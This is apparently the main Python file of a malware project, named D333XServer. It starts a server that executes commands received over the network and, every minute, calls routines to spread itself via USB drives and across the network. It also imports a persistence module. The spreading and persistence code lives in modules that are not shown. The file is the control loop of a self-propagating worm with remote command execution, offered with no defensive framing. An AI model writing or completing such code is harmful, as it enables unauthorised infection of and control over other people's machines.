import sys  
import os  

# Добавьте путь к корневой папке проекта  
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))  

from core.network import NetworkCore
from core.commands import CommandHandler
from modules.spreader import Spreader
from modules.persistence import PersistenceManager
import time

class D333XServer(NetworkCore):
    def __init__(self):
        super().__init__()
        self.spreader = Spreader()
    
    def process_command(self, data: bytes) -> bytes:
        return CommandHandler.execute(data.decode())
    
    def start(self):
        super().start_server()
        while True:
            self.spreader.spread_via_usb()
            self.spreader.spread_via_network()
            time.sleep(60)

if __name__ == "__main__":
    server = D333XServer()
    server.start()